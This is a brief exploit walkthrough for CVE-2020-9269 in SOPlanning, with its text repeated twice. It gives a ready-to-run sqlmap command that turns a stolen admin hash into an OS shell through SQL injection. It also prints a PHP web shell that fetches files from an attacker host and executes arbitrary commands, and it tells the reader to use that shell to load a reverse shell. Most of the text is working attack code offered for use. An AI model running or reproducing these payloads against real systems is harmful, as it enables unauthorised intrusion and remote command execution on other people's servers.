CVE-2020-9269
Once you have extracted the admin hash, you can now use that to get command execution on the machine through another SQL Injection.
Save the admin hash and insert it into SQLMap as such:
````
sqlmap -u 'http://HOSTHERE/soplanning/www/export\_ical.php?login=admin&hash=HASHHERE&nocache&users=ADM&age=3' -p users --risk=3 --level=5 --threads=10 --dbms=mysql --keep-alive --os-shell\
````
Now you have a web shell uploaded to the server:
````

GET parameter 'users' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

Using that webshell you can upload your reverse shell.
Props to FalconSpy (https://twitter.com/0xfalconspy) for the small webshell:
````
php if (isset($\_REQUEST[‘fupload’])) { file\_put\_contents($\_REQUEST[‘fupload’], file\_get\_contents(‘http://IP\_ADDR/' . $\_REQUEST[‘fupload’])); }; if (isset($\_REQUEST[‘fexec’])) { echo ‘<pre’ . shell\_exec($\_REQUEST[‘fexec’]) . ‘’; }; ?>
````
Use that to upload and execute your shell after the SQLMap stager is uploaded.
Mad props to : https://twitter.com/HackingHomebre1 for the POC creation and assist.

CVE-2020-9269

Once you have extracted the admin hash, you can now use that to get command execution on the machine through another SQL Injection.

Save the admin hash and insert it into SQLMap as such:

```
sqlmap -u 'http://HOSTHERE/soplanning/www/export_ical.php?login=admin&hash=HASHHERE&nocache&users=ADM&age=3' -p users --risk=3 --level=5 --threads=10 --dbms=mysql --keep-alive --os-shell\

```

Now you have a web shell uploaded to the server:

```

Using that webshell you can upload your reverse shell.

Props to FalconSpy (<https://twitter.com/0xfalconspy>) for the small webshell:

```
<?php if (isset($_REQUEST[‘fupload’])) { file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); }; if (isset($_REQUEST[‘fexec’])) { echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; }; ?>

```

Use that to upload and execute your shell after the SQLMap stager is uploaded.
